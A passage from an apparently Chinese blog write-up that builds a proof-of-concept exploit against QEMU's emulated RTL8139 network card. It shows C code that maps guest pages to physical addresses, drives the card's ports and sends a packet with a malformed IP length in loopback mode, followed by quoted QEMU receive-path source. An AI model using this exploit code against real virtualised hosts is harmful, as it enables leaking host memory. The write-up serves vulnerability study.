class="comment">/* TCP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 bits 0...15 : buffer size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE (1&lt;&lt;16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)</span></span><br><span class="line"><span class="comment">/* w1 add tag flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TAGC (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* w1 bits 0...15 : VLAN tag (big endian) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)</span></span><br><span class="line"><span class="comment">/* w2 low  32bit of Rx buffer ptr */</span></span><br><span class="line"><span class="comment">/* w3 high 32bit of Rx buffer ptr */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set after transmission */</span></span><br><span class="line"><span class="comment">/* FIFO underrun flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_UNF (1&lt;&lt;25)</span></span><br><span class="line"><span class="comment">/* transmit error summary flag, valid if set any of three below */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_TES (1&lt;&lt;23)</span></span><br><span class="line"><span class="comment">/* out-of-window collision flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_OWC (1&lt;&lt;22)</span></span><br><span class="line"><span class="comment">/* link failure flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_LNKF (1&lt;&lt;21)</span></span><br><span class="line"><span class="comment">/* excessive collisions flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_EXC (1&lt;&lt;20)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USHRT_MAX 65535</span></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits &#123;</span><br><span class="line">	TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">/* enable loopback test mode */</span></span><br><span class="line">	<span class="comment">/*...*/</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits &#123;</span><br><span class="line">	AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">	AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">	AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">	AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">	AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">	AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">	Wrap            = <span class="number">0x80</span>,</span><br><span class="line">	MxDMA256        = <span class="number">0x400</span>,</span><br><span class="line">	RbLen64         = <span class="number">0x1800</span>,</span><br><span class="line">	RxFTh512        = <span class="number">0xa000</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers &#123;</span><br><span class="line">    MAC0 = <span class="number">0</span>,        <span class="comment">/* Ethernet hardware address. */</span></span><br><span class="line">    MAR0 = <span class="number">8</span>,        <span class="comment">/* Multicast filter. */</span></span><br><span class="line">    TxStatus0 = <span class="number">0x10</span>,<span class="comment">/* Transmit status (Four 32bit registers). C mode only */</span></span><br><span class="line">                     <span class="comment">/* Dump Tally Conter control register(64bit). C+ mode only */</span></span><br><span class="line">    TxAddr0 = <span class="number">0x20</span>,  <span class="comment">/* Tx descriptors (also four 32bit). */</span></span><br><span class="line">    RxBuf = <span class="number">0x30</span>,</span><br><span class="line">    ChipCmd = <span class="number">0x37</span>,</span><br><span class="line">    RxBufPtr = <span class="number">0x38</span>,</span><br><span class="line">    RxBufAddr = <span class="number">0x3A</span>,</span><br><span class="line">    IntrMask = <span class="number">0x3C</span>,</span><br><span class="line">    IntrStatus = <span class="number">0x3E</span>,</span><br><span class="line">    TxConfig = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig = <span class="number">0x44</span>,</span><br><span class="line">    Timer = <span class="number">0x48</span>,        <span class="comment">/* A general-purpose counter. */</span></span><br><span class="line">    RxMissed = <span class="number">0x4C</span>,    <span class="comment">/* 24 bits valid, write clears. */</span></span><br><span class="line">    Cfg9346 = <span class="number">0x50</span>,</span><br><span class="line">    Config0 = <span class="number">0x51</span>,</span><br><span class="line">    Config1 = <span class="number">0x52</span>,</span><br><span class="line">    FlashReg = <span class="number">0x54</span>,</span><br><span class="line">    MediaStatus = <span class="number">0x58</span>,</span><br><span class="line">    Config3 = <span class="number">0x59</span>,</span><br><span class="line">    Config4 = <span class="number">0x5A</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    HltClk = <span class="number">0x5B</span>,</span><br><span class="line">    MultiIntr = <span class="number">0x5C</span>,</span><br><span class="line">    PCIRevisionID = <span class="number">0x5E</span>,</span><br><span class="line">    TxSummary = <span class="number">0x60</span>, <span class="comment">/* TSAD register. Transmit Status of All Descriptors*/</span></span><br><span class="line">    BasicModeCtrl = <span class="number">0x62</span>,</span><br><span class="line">    BasicModeStatus = <span class="number">0x64</span>,</span><br><span class="line">    NWayAdvert = <span class="number">0x66</span>,</span><br><span class="line">    NWayLPAR = <span class="number">0x68</span>,</span><br><span class="line">    NWayExpansion = <span class="number">0x6A</span>,</span><br><span class="line">    <span class="comment">/* Undocumented registers, but required for proper operation. */</span></span><br><span class="line">    FIFOTMS = <span class="number">0x70</span>,        <span class="comment">/* FIFO Control and test. */</span></span><br><span class="line">    CSCR = <span class="number">0x74</span>,        <span class="comment">/* Chip Status and Configuration Register. */</span></span><br><span class="line">    PARA78 = <span class="number">0x78</span>,</span><br><span class="line">    PARA7c = <span class="number">0x7c</span>,        <span class="comment">/* Magic transceiver parameter register. */</span></span><br><span class="line">    Config5 = <span class="number">0xD8</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    TxPoll        = <span class="number">0xD9</span>,    <span class="comment">/* Tell chip to check Tx descriptors for work */</span></span><br><span class="line">    RxMaxSize    = <span class="number">0xDA</span>, <span class="comment">/* Max size of an Rx packet (8169 only) */</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>, <span class="comment">/* C+ Command register (C+ mode only) */</span></span><br><span class="line">    IntrMitigate    = <span class="number">0xE2</span>,    <span class="comment">/* rx/tx interrupt mitigation control */</span></span><br><span class="line">    RxRingAddrLO    = <span class="number">0xE4</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    RxRingAddrHI    = <span class="number">0xE8</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    TxThresh    = <span class="number">0xEC</span>, <span class="comment">/* Early Tx threshold */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> ChipCmdBits &#123;</span><br><span class="line">    CmdReset = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* C+ mode */</span></span><br><span class="line"><span class="keyword">enum</span> CplusCmdBits &#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cplus_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> txdw0;</span><br><span class="line">	<span class="keyword">uint32_t</span> txdw1;</span><br><span class="line">	<span class="keyword">uint32_t</span> txbufLO;</span><br><span class="line">	<span class="keyword">uint32_t</span> txbufHI;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> rtl8139_packet [] = &#123;</span><br><span class="line">	<span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>,</span><br><span class="line">	<span class="number">0x56</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0xde</span>, <span class="number">0xad</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x40</span>, <span class="number">0x06</span>, <span class="number">0xde</span>, <span class="number">0xad</span>, <span class="number">0xc0</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0xc0</span>, <span class="number">0xa8</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0x02</span>, <span class="number">0xde</span>, <span class="number">0xad</span>, <span class="number">0xbe</span>, <span class="number">0xef</span>, <span class="number">0xca</span>, <span class="number">0xfe</span>, <span class="number">0xba</span>, <span class="number">0xbe</span>, <span class="number">0xca</span>, <span class="number">0xfe</span>,</span><br><span class="line">	<span class="number">0xba</span>, <span class="number">0xbe</span>, <span class="number">0x50</span>, <span class="number">0x10</span>, <span class="number">0xde</span>, <span class="number">0xad</span>, <span class="number">0xde</span>, <span class="number">0xad</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> v2p(<span class="keyword">void</span> * addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> index = (<span class="keyword">uint64_t</span>)addr / PAGE_SIZE;</span><br><span class="line">    lseek(fd,index * <span class="number">8</span>,SEEK_SET);</span><br><span class="line">    <span class="keyword">uint64_t</span> num = <span class="number">0</span>;</span><br><span class="line">    read(fd,&amp;num,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((num &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>)) &lt;&lt; <span class="number">12</span>) + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cfgtx</span><span class="params">(struct cplus_desc * addr,<span class="keyword">char</span> * buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    addr-&gt;txdw0 |= CP_TX_OWN|CP_TX_EOR|CP_TX_LS|CP_TX_IPCS|CP_TX_LGSEN;</span><br><span class="line">    addr-&gt;txdw0 += ETH_MTU + ETH_HLEN;</span><br><span class="line">    addr-&gt;txbufLO = v2p(buf);</span><br><span class="line">    <span class="keyword">uint32_t</span> paddr = v2p(addr);</span><br><span class="line">    outl(paddr,RTL8139 + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>,RTL8139 + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cfgrx</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send</span><span class="params">(<span class="keyword">void</span> * buf,<span class="keyword">void</span> * data,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, data, len);</span><br><span class="line">    outb((<span class="number">1</span> &lt;&lt; <span class="number">6</span>), RTL8139+ TxPoll);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>,O_RDONLY);</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    outb(CmdTxEnb|CmdRxEnb,RTL8139 + ChipCmd);</span><br><span class="line">    outw(CPlusTxEnb|CPlusRxEnb,RTL8139 + CpCmd);</span><br><span class="line">    outl(TxLoopBack, RTL8139 + TxConfig);</span><br><span class="line">	outl(AcceptMyPhys, RTL8139 + RxConfig);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cplus_desc</span> * <span class="title">addr</span> = <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">cplus_desc</span>));</span></span><br><span class="line">    <span class="built_in">memset</span>(addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(struct cplus_desc));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * tx_buf = <span class="built_in">malloc</span>(ETH_HLEN + ETH_MTU);</span><br><span class="line">    <span class="built_in">memset</span>(tx_buf,<span class="number">0</span>,ETH_HLEN + ETH_MTU);</span><br><span class="line"></span><br><span class="line">    cfgtx(addr,tx_buf);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    send(tx_buf, rtl8139_packet,<span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还差一个cfgrx()函数,也就是接受函数.开启了loopback后,会调用rtl8139_do_receive函数,这里就是关于rx的初始化了,查看源码,可以总结成如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">rtl8139_do_receive</span><span class="params">(NetClientState *nc, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *buf, <span class="keyword">size_t</span> size_, <span class="keyword">int</span> do_interrupt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = qemu_get_nic_opaque(nc);</span><br><span class="line">    PCIDevice *d = PCI_DEVICE(s);</span><br><span class="line">    </span><br><span class="line">    ....</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!rtl8139_receiver_enabled(s))</span><br><span class="line">    &#123;</span><br><span class="line">        DPRINTF(<span class="string">"receiver disabled ================\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* <span class="doctag">XXX:</span> check this */</span></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;RxConfig &amp; AcceptAllPhys) &#123;</span><br><span class="line">        <span class="comment">/* promiscuous: receive all */</span></span><br><span class="line">        DPRINTF(<span class="string">"&gt;&gt;&gt; packet received in promiscuous mode\n"</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(buf,  broadcast_macaddr, <span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="comment">/* broadcast address */</span></span><br><span class="line">            <span class="keyword">if</span> (!(s-&gt;RxConfig &amp; AcceptBroadcast))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"&gt;&gt;&gt; broadcast packet rejected\n"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* update tally counter */</span></span><br><span class="line">                ++s-&gt;tally_counters.RxERR;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> size;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            packet_header |= RxBroadcast;</span><br><span class="line"></span><br><span class="line">            DPRINTF(<span class="string">"&gt;&gt;&gt; broadcast packet received\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* update tally counter */</span></span><br><span class="line">            ++s-&gt;tally_counters.RxOkBrd;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (buf[<span class="number">0</span>] &amp; <span class="number">0x01</span>) &#123;</span><br><span class="line">            <span class="comment">/* multicast */</span></span><br><span class="line">            <span class="keyword">if</span> (!(s-&gt;RxConfig &amp; AcceptMulticast))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"&gt;&gt;&gt; multicast packet rejected\n"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* update tally counter */</span></span><br><span class="line">                ++s-&gt;tally_counters.RxERR;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> size;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> mcast_idx = net_crc32(buf, ETH_ALEN) &gt;&gt; <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!(s-&gt;mult[mcast_idx &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (mcast_idx &amp; <span class="number">7</span>))))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"&gt;&gt;&gt; multicast address mismatch\n"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* update tally counter */</span></span><br><span class="line">                ++s-&gt;tally_counters.RxERR;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> size;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            packet_header |= RxMulticast;</span><br><span class="line"></span><br><span class="line">            DPRINTF(<span class="string">"&gt;&gt;&gt; multicast packet received\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* update tally counter */</span></span><br><span class="line">            ++s-&gt;tally_counters.RxOkMul;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s-&gt;phys[<span class="number">0</span>] == buf[<span class="number">0</span>] &amp;&amp;</span><br><span class="line">                   s-&gt;phys[<span class="number">1</span>] == buf[<span class="number">1</span>] &amp;&amp;</span><br><span class="line">                   s-&gt;phys[<span class="number">2</span>] == buf[<span class="number">2</span>] &amp;&amp;</span><br><span class="line">                   s-&gt;phys[<span class="number">3</span>] == buf[<span class="number">3</span>] &amp;&amp;</span><br><span class="line">                   s-&gt;phys[<span class="number">4</span>] == buf[<span class="number">4</span>] &amp;&amp;</span><br><span class="line">                   s-&gt;phys[<span class="number">5</span>] == buf[<span class="number">5</span>]) &#123;</span><br><span class="line">            <span class="comment">/* match */</span></span><br><span class="line">            <span class="keyword">if</span> (!(s-&gt;RxConfig &amp; AcceptMyPhys))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"&gt;&gt;&gt; rejecting physical address matching packet\n"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* update tally counter */</span></span><br><span class="line">                ++s-&gt;tally_counters.RxERR;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> size;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            packet_header |= RxPhysical;</span><br><span class="line"></span><br><span class="line">            DPRINTF(<span class="string">"&gt;&gt;&gt; physical address matching packet received\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* update tally counter */</span></span><br><span class="line">            ++s-&gt;tally_counters.RxOkPhy;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            DPRINTF(<span class="string">"&gt;&gt;&gt; unknown packet\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* update tally counter */</span></span><br><span class="line">            ++s-&gt;tally_counters.RxERR;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> size;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if too small buffer, then expand it</span></span><br><span class="line"><span class="comment">     * Include some tailroom in case a vlan tag is later removed. */</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt; MIN_BUF_SIZE + VLAN_HLEN) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf1, buf, size);</span><br><span class="line">        <span class="built_in">memset</span>(buf1 + size, <span class="number">0</span>, MIN_BUF_SIZE + VLAN_HLEN - size);</span><br><span class="line">        buf = buf1;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; MIN_BUF_SIZE) &#123;</span><br><span class="line">            size = MIN_BUF_SIZE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rtl8139_cp_receiver_enabled(s))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!rtl8139_cp_rx_valid(s)) &#123;</span><br><span class="line">            <span class="keyword">return</span> 